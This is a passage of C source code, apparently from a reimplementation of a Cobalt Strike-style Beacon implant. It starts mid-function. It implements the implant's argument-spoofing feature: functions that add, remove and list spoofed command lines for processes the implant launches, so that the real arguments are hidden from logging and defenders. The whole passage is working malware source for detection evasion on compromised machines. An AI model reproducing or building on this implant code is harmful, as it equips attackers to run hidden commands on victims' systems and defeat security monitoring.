		while (pgBeaconParameterSpoofing->state != 1 || strcmp(buffer, pgBeaconParameterSpoofing->cmd1))
		{
			pgBeaconParameterSpoofing = pgBeaconParameterSpoofing->Linked;
			if (!pgBeaconParameterSpoofing)
			{
				BeaconSpoofArgs* temp = (BeaconSpoofArgs*)malloc(0x4008u);
				memset(temp, 0, sizeof(BeaconSpoofArgs));
				temp->state = 0;
				temp->Linked = oldgBeaconParameterSpoofing;
				gBeaconParameterSpoofing = temp;
				return temp;
			}
		}
	}
	else
	{
		BeaconSpoofArgs* temp = (BeaconSpoofArgs*)malloc(0x4008u);
		memset(temp, 0, sizeof(BeaconSpoofArgs));
		temp->state = 0;
		temp->Linked = oldgBeaconParameterSpoofing;
		gBeaconParameterSpoofing = temp;
		return temp;
	}
}

void BeaconSpoofArgsAdd(char* Taskdata, int Taskdata_size)
{

	datap* pdatap = BeaconDataInit(0x6000u);
	char* envpath = BeaconDataPtr(pdatap, 0x2000);
	char* processpath = BeaconDataPtr(pdatap, 0x2000);
	char* arg = BeaconDataPtr(pdatap, 0x2000);

	datap taskdatap;
	BeaconDataParse(&taskdatap, Taskdata, Taskdata_size);
	BeaconDataCopyToBuffer(&taskdatap, envpath, 0x2000);
	BeaconExpandEnvironmentStringsA(envpath, processpath, 0x2000u);
	BeaconDataCopyToBuffer(&taskdatap, arg, 0x2000);
	BeaconSpoofArgs* pBeaconSpoofArgs = AddSpoofArgs(processpath);
	pBeaconSpoofArgs->state = 1;
	BeaconExpandEnvironmentStringsA(envpath, pBeaconSpoofArgs->cmd1, 0x2000u);
	BeaconExpandEnvironmentStringsA(arg, pBeaconSpoofArgs->cmd2, 0x2000u);
	BeaconDataClearFree(pdatap);
}

void SpoofArgsRemove(char* Taskdata, int Taskdata_size)
{
	BeaconSpoofArgs* pgBeaconParameterSpoofing = gBeaconParameterSpoofing;
	char* buffer = (char*)malloc(0x2000u);
	Taskdata[Taskdata_size] = 0;
	BeaconExpandEnvironmentStringsA(Taskdata, buffer, 0x2000u);
	while (pgBeaconParameterSpoofing)
	{
		if (pgBeaconParameterSpoofing->state == 1 && !strcmp(pgBeaconParameterSpoofing->cmd1, buffer))
		{
			pgBeaconParameterSpoofing->state = 0;
			memset(pgBeaconParameterSpoofing->cmd1, 0, sizeof(pgBeaconParameterSpoofing->cmd1));
			memset(pgBeaconParameterSpoofing->cmd2, 0, sizeof(pgBeaconParameterSpoofing->cmd2));
		}
		pgBeaconParameterSpoofing = pgBeaconParameterSpoofing->Linked;
	}
	memset(buffer, 0, 0x2000u);
	free(buffer);
}

void SpoofArgsList()
{
	formatp pformatp;
	BeaconFormatAlloc(&pformatp, 0x8000u);
	BeaconSpoofArgs* pgBeaconParameterSpoofing = gBeaconParameterSpoofing;
	while (pgBeaconParameterSpoofing)
	{
		if (pgBeaconParameterSpoofing->state == 1)
		{
			BeaconFormatPrintf(&pformatp, (char*)"%s\n", pgBeaconParameterSpoofing->cmd2);
		}
		pgBeaconParameterSpoofing = pgBeaconParameterSpoofing->Linked;
	}
	int length = BeaconFormatlength(&pformatp);
	char* buffer = BeaconFormatOriginalPtr(&pformatp);
	BeaconTaskOutput(buffer, length, 0);
	BeaconFormatFree(&pformatp);
}